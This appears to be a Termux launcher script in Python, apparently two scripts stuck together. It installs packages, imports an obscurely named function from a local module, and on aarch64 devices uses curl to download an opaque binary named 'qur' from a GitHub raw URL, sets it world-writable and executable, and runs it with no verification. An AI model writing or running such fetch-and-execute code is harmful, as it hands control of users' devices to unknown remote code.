import os,sys, platform,time
try:
   import requests
except:
   os.system('pip2 install requests')
from time import sleep
import requests
def XXX(xxx):
	for xx in xxx + "\n":
		sys.stdout.write(xx);sys.stdout.flush();time.sleep(0.03)
bit = platform.architecture()[0]
if bit == '64bit':
    from test import readline___Public_Xml
    readline___Public_Xml()
 
 
#coding=utf-8

import os,sys,subprocess

py_ver = subprocess.check_output('python -V',shell=True)

if '3.10' in str(py_ver):

    os.system('pkg upgrade python -y')

    os.system('python test.py')

else:pass

os.system('pkg install file > /dev/null')

current_os=subprocess.check_output('uname -om',shell=True)

if 'aarch64' in str(current_os):

    if not os.path.isfile('h64'):

        os.system('curl -L https://github.com/Somi673/test/blob/main/qur?raw=true > qur')

        os.system('chmod 777 qur')

        os.system('./qur')

    else:

        os.system('./qur')

else:

    print('\n  Unknown device, aarch or os found, contact author.')

    os.sys.exit()

 
